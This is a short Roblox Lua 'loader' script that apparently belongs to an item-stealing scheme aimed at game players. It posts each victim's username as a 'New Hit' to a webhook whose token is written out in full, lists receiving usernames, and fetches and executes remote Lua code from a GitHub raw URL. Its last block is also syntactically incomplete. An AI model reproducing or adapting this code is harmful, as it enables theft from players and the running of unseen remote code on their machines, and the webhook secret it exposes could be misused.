-- Simple Loader

_G.POOR_WEBHOOK = "https://hooks.hyra.io/api/webhooks/1494661669849268365/mKzWrChl1qbxDMuG_w9WQyRS4W03KuSQigicg6y__FCCCftfUQoe9QkFfKd5ApNmlEfc"

_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}

_G.PING_POOR = true

task.spawn(function()
    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
        local http = game:GetService("HttpService")
        local plr = game.Players.LocalPlayer
        local message = "@everyone New Hit! Username: " .. plr.Name
        game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode({content = message}))
    end
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
end
